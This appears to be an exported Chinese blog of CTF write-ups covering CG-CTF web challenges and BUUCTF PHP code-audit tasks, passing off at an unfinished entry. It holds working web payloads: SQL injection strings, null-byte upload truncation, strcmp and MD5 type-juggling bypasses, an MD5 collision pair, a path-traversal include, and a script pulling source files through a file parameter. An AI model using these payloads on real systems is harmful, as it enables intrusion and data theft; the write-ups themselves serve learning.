<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119093738.png" alt=""></p>
<p>再使用Burpsuite查看请求包：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119094407.png" alt=""></p>
<p>尝试在<code>/uploads/</code>后面加上<code>test.php+空格 </code>：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119094917.png" alt=""></p>
<p>然后将打开HEX，将<code>test.php</code>后面空格<code>20</code>改为<code>00</code>，构造<code>00</code>截断：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119094833.png" alt=""></p>
<p>得到<strong>flag:nctf{welcome_to_hacks_world}</strong></p>
<h4 id="SQL注入1">SQL注入1</h4>
<h5 id="题干-v14">题干</h5>
<p>听说你也会注入？</p>
<h5 id="题解-v13">题解</h5>
<p>关键代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    mysql_connect(SAE_MYSQL_HOST_M . <span class="string">&#x27;:&#x27;</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = trim($_POST[user]);</span><br><span class="line">  $pass = md5(trim($_POST[pass]));</span><br><span class="line">  $sql=<span class="string">&quot;select user from ctf where (user=&#x27;&quot;</span>.$user.<span class="string">&quot;&#x27;) and (pw=&#x27;&quot;</span>.$pass.<span class="string">&quot;&#x27;)&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.$sql;</span><br><span class="line">  $query = mysql_fetch_array(mysql_query($sql));</span><br><span class="line">  <span class="keyword">if</span>($query[user]==<span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>($query[user] != <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;You are not admin!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $query[user];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>常规SQL注入的题目，使用admin登录，闭合<code>')</code>，截断pw判断：</p>
<p>payload：<code>user=admin')#&amp;pass=1</code></p>
<p>**flag:nctf{ni_ye_hui_sql?} **</p>
<h4 id="pass-check">pass check</h4>
<h5 id="题干-v15">题干</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">pass=@$_POST[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">$pass1=***********;<span class="comment">//被隐藏起来的密码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($pass))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(@!strcmp($pass,$pass1))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag:nctf&#123;*&#125;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the pass is wrong!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;please input pass!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="题解：">题解：</h5>
<p><code>strcmp(array,string)==null==0</code>，所以POST一个数组对象即可。</p>
<p>payload: <code>pass[]=qaz</code></p>
<p><strong>flag:nctf{strcmp_is_n0t_3afe}</strong></p>
<h4 id="起名字真难">起名字真难</h4>
<h5 id="题干-v16">题干</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noother_says_correct</span>(<span class="params">$number</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">       $one = ord(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">       $nine = ord(<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">       <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">       &#123;   </span><br><span class="line">               $digit = ord($number&#123;$i&#125;);</span><br><span class="line">               <span class="keyword">if</span> ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">               &#123;</span><br><span class="line">                       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">               &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> $number == <span class="string">&#x27;54975581388&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$flag=<span class="string">&#x27;*******&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(noother_says_correct($_GET[<span class="string">&#x27;key&#x27;</span>]))</span><br><span class="line">   <span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&#x27;access denied&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="题解-v14">题解</h5>
<p>不能出现<code>1-9</code>之间的数字，那么我们只能尝试将<code>54975581388</code>转成16进制</p>
<p>转换后的结果是<code>ccccccccc</code>，可以使用</p>
<p>payload：<code>?key=0xccccccccc</code></p>
<p>得到<code>The flag is:nctf&#123;follow_your_dream&#125;</code></p>
<h4 id="密码重置">密码重置</h4>
<h5 id="题干-v17">题干</h5>
<p>重置管理员账号：admin 的密码</p>
<p>你在点击忘记密码之后 你的邮箱收到了一封重置密码的邮件</p>
<h5 id="题解-v15">题解</h5>
<p>观察页面可以发现地址栏的参数经过了Base64编码处理，解码得到<code>ctfuser</code>。如果要重置admin的密码，我们抓个包将地址栏参数和POST数据修改一下即可：</p>
<p><code>?user1=%59%57%52%74%61%57%34%3d</code></p>
<p><code>user=admin&amp;newpass=1&amp;vcode=1234</code></p>
<p><strong>flag is:nctf{reset_password_often_have_vuln}</strong></p>
<h4 id="SQL-Injection">SQL Injection</h4>
<h5 id="题干-v18">题干</h5>
<p>继续注入吧！ TIP:反斜杠可以用来转义 仔细查看相关函数的用法</p>
<h5 id="题解-v16">题解</h5>
<p>用F12查看源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#GOAL: login as admin,then get the flag;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;db.inc.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">		$str=stripslashes($str);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((<span class="keyword">string</span>)$_GET[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">$password = @clean((<span class="keyword">string</span>)$_GET[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">$query=<span class="string">&#x27;SELECT * FROM users WHERE name=\&#x27;&#x27;</span>.$username.<span class="string">&#x27;\&#x27; AND pass=\&#x27;&#x27;</span>.$password.<span class="string">&#x27;\&#x27;;&#x27;</span>;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line"><span class="keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;Invalid password!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>sql语句：<code>SELECT * FROM users WHERE name=\''.$username.'\' AND pass=\''.$password.'\';</code></p>
<p>观察clean函数中的返回值经过htmlentities()函数过滤，这个字符将字符转换为 HTML 转义字符 ，第二个参数如果没有默认只转换双引号，但参数值为ENT_QUOTES时既转换双引号又转换单引号。</p>
<p>我们最终目标是平衡单引号，可是经过这个函数过滤我们无法输入单引号，只能想怎么消灭原来的单引号。</p>
<p>构造payload：<code>?username=\&amp;password= or 1=1#</code>使得查询语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE name&#x3D;&#39;\&#39; AND pass&#x3D;&#39; or 1%23&#39;</span><br><span class="line">即</span><br><span class="line">SELECT * FROM users WHERE </span><br><span class="line">name&#x3D;&#39;\&#39; AND pass&#x3D;&#39;            『 [name]的值为 [&#39; AND pass&#x3D;]，单引号被转义了，显然逻辑值为false 』</span><br><span class="line">or 1&#x3D;1                         『 但没关系，[false or 1] 的逻辑值为真 』 </span><br><span class="line">%23&#39;                           『 %23是#的url编码，注释掉多余的单引号 』</span><br><span class="line">即</span><br><span class="line">select * from users where false or 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>**flag:nctf{sql_injection_is_interesting} **</p>
<h4 id="综合题">综合题</h4>
<p>打开后发现是一串看不懂的代码，google一下是jsfuck编码，<a href="http://www.bugku.com/tools/jsfuck/">在线解码网站</a>，直接拖到控制台界面执行得到 1bc29b36f623ba82aaf6724fd3b16718.php。</p>
<p>接着打开这个网站得到提示：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119161243.png" alt=""></p>
<p>根据提示查看http头信息：<br>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119161306.png" alt=""></p>
<p>history of bash提示我们在Linux系统中有一个<code>.history_bash</code>文件来记录最近若干条bash命令。 所以尝试打开该目录下这个文件 url：<code>http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history </code>，得到新的提示：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119163814.png" alt=""></p>
<p>在当前目录下访问<code>http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip</code>得到**flag: nctf{bash_history_means_what} **</p>
<h4 id="SQL注入2">SQL注入2</h4>
<h5 id="题干-v19">题干</h5>
<p>注入第二题~~主要考察union查询</p>
<h5 id="题解-v17">题解</h5>
<p>关键代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">  mysql_connect(SAE_MYSQL_HOST_M . <span class="string">&#x27;:&#x27;</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">  mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">  $user = $_POST[user];</span><br><span class="line">  $pass = md5($_POST[pass]);</span><br><span class="line">  $query = @mysql_fetch_array(mysql_query(<span class="string">&quot;select pw from ctf where user=&#x27;<span class="subst">$user</span>&#x27;&quot;</span>));</span><br><span class="line">  <span class="keyword">if</span> (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>strcasecmp(str1, str2)：两个字符串相等则返回0</p>
<p>观察一下条件语句 <code>($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))</code></p>
<p>mysql_fetch_array() 函数返回的关联数组中键为字段名</p>
<p>构造payload：post一下数据</p>
<p>user=’ union select md(1)#&amp;pass=1</p>
<p><strong>flag: ntcf{union_select_is_wtf}</strong></p>
<h4 id="综合题2">综合题2</h4>
<p>这道题比较有综合性，我也是看了<a href="https://www.wxylyw.com/2018/11/13/CG-CTF-%E7%BB%BC%E5%90%88%E9%A2%98-2-writeup/">这篇WriteUp</a>的提示，就做一个知识点的总结吧：</p>
<ul>
<li>
<p>下载提示文件的Python脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">url=<span class="string">&quot;http://cms.nuptzj.cn/about.php?file=&quot;</span></span><br><span class="line">file_list = [<span class="string">&quot;index.php&quot;</span>,<span class="string">&quot;passencode.php&quot;</span>,<span class="string">&quot;say.php&quot;</span>,<span class="string">&quot;config.php&quot;</span>,<span class="string">&quot;antixss.php&quot;</span>,<span class="string">&quot;about.php&quot;</span>,<span class="string">&quot;so.php&quot;</span>,<span class="string">&quot;antiinject.php&quot;</span>,<span class="string">&quot;xlcteam.php&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> file_list:</span><br><span class="line">    res = requests.get(url+i)</span><br><span class="line">    print(<span class="string">&quot;dowload &quot;</span>+i)</span><br><span class="line">    <span class="keyword">if</span> res.status_code==<span class="number">200</span>:</span><br><span class="line">        res.encoding=<span class="string">&quot;utf8&quot;</span></span><br><span class="line">    <span class="keyword">with</span> codecs.open(i,<span class="string">&quot;w+&quot;</span>,<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> handle:</span><br><span class="line">        print(<span class="string">&quot;done&quot;</span>)</span><br><span class="line">        text = BeautifulSoup(res.text,<span class="string">&quot;lxml&quot;</span>).text</span><br><span class="line">        handle.write(text)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>SQL注入时需要正确地找到注入点</p>
</li>
<li>
<p>SQL注入过滤了空格可以使用<code>/**/</code>代替</p>
</li>
<li>
<p>回调函数后门</p>
</li>
</ul>
<h4 id="密码重置2">密码重置2</h4>
<h5 id="题干-v20">题干</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TIPS:</span><br><span class="line">1.管理员邮箱观察一下就可以找到</span><br><span class="line">2.linux下一般使用vi编辑器，并且异常退出会留下备份文件</span><br><span class="line">3.弱类型bypass</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="题解-v18">题解</h5>
<p>查看源代码文件得到管理员邮箱：<code>admin@nuptzj.cn</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119170606.png" alt=""></p>
<p>根据提示，学到一个新知识是<a href="https://www.cnblogs.com/DMDD/p/5052048.html">非正常关闭vi编辑器时会生成一个.swp文件</a></p>
<p>查看.index.php.swp和.submit.php.swp文件，能打开.submit.php.swp文件，关键代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line">	<span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">&#x27;fail&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>($token!=<span class="string">&#x27;0&#x27;</span>) <span class="keyword">die</span>(<span class="string">&#x27;fail&#x27;</span>);</span><br><span class="line">	$sql = <span class="string">&quot;SELECT count(*) as num from `user` where token=&#x27;<span class="subst">$token</span>&#x27; AND email=&#x27;<span class="subst">$emailAddress</span>&#x27;&quot;</span>;</span><br><span class="line">	$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;db error&#x27;</span>);</span><br><span class="line">	$r = mysql_fetch_assoc($r);</span><br><span class="line">	$r = $r[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> $flag;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;失败了呀&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>要求token长度为10且token!=0为假，有两种绕过方法，第一种传入token=0000000000绕过，第二种利用弱类型（含有数字内容的字符串也会被转换类型）传入token=0e12345678绕过。</p>
<p><strong>flag:nctf{thanks_to_cumt_bxs}</strong></p>
<h4 id="file-get-contents">file_get_contents</h4>
<h5 id="题干-v21">题干</h5>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--$file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(@file_get_contents($file) == <span class="string">&quot;meizijiu&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $nctf;</span><br><span class="line">&#125;--&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="题解-v19">题解</h5>
<p>file_get_contents() 函数将整个文件读入一个字符串</p>
<p>php伪协议之一：”php://input”可以访问请求的原始数据的只读流,，将post请求中的数据作为PHP代码执行。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119194514.png" alt=""></p>
<h4 id="变量覆盖-v2">变量覆盖</h4>
<h5 id="题干-v22">题干</h5>
<p>变量覆盖，代码审计类题目</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--<span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;  </span><br><span class="line">        $$key = $value;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>($name == <span class="string">&quot;meizijiu233&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;--&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="题解-v20">题解</h5>
<p>foreach 遍历数组或对象，它会在每次循环中把当前的键名赋给变量 $key，值赋给变量$value。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191119194917.png" alt=""></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf刷题——PHP代码审计</title>
    <url>/Web_security/ctf_writeup/4.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="BUUCTF刷题——PHP代码审计">BUUCTF刷题——PHP代码审计</h1>
<h2 id="HCTF2018-WarmingUp">[HCTF2018]WarmingUp</h2>
<h3 id="考点">考点</h3>
<ul>
<li>代码审计</li>
</ul>
<h3 id="解题">解题</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><a href="https://www.cnblogs.com/h3zh1/p/12853478.html">https://www.cnblogs.com/h3zh1/p/12853478.html</a></p>
</blockquote>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;f3a0386f-ebf6-4b35-8a60-87de301e158a.node3.buuoj.cn&#x2F;source.php?file&#x3D;source.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
<p>我感觉上面这个分析有点问题，这个payload到了第23行的if语句就直接return，没有后面的代码啥事了。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619203925.png" alt=""></p>
<h2 id="极客大挑战2019-PHP">[极客大挑战2019]PHP</h2>
<h3 id="TODO">TODO</h3>
<h2 id="BJDCTF2020-Easy-MD5">BJDCTF2020 Easy MD5</h2>
<h3 id="考点-v2">考点</h3>
<ul>
<li>PHP MD5</li>
</ul>
<h3 id="解题-v2">解题</h3>
<h4 id="第一关">第一关</h4>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620161827.png" alt=""></p>
<p>payload：<code>ffifdyop</code></p>
<blockquote>
<p>分析文章：<a href="https://blog.csdn.net/March97/article/details/81222922?utm_source=blogxgwz9">https://blog.csdn.net/March97/article/details/81222922?utm_source=blogxgwz9</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">content: ffifdyop</span><br><span class="line">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class="line">raw: &#39;or&#39;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1  ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。</p>
</blockquote>
<h4 id="第二关">第二关</h4>
<p>MD5 碰撞</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620163106.png" alt=""></p>
<h4 id="第三关">第三关</h4>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&#x27;param1&#x27;</span>]!==$_POST[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5($_POST[<span class="string">&#x27;param1&#x27;</span>])===md5($_POST[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>为MD5强类型比较，这时候传入两个数组，数组的值不相等，造成MD5加密时报错产生NULL=NULL的情况，绕过比较。</p>
<h3 id="拓展">拓展</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((<span class="keyword">string</span>)$_POST[<span class="string">&#x27;param1&#x27;</span>]!==(<span class="keyword">string</span>)$_POST[<span class="string">&#x27;param2&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;param1&#x27;</span>])===md5($_POST[<span class="string">&#x27;param2&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://xz.aliyun.com/t/2232">https://xz.aliyun.com/t/2232</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">param1&#x3D;1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02Sj%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3E%D6%D1mE%AAL4%E1%F2d%CD%E1%073c%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F_D%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%3C%F9%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%90%BC%B5%2F%ED&amp;param2&#x3D;1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02S%EA%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3EV%D2mE%AAL4%E1%F2d%CD%E1%073%E3%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F%DFD%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%BC%F8%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%10%BC%B5%2F%ED</span><br></pre></td></tr></table></figure>
<h2 id="MRCTF2020-Ez-bypass">MRCTF2020 Ez_bypass</h2>
<h3 id="考点-v3">考点</h3>
<ul>
<li>MD5绕过</li>
<li>is_numeric绕过</li>
</ul>
<h3 id="解题-v3">解题</h3>
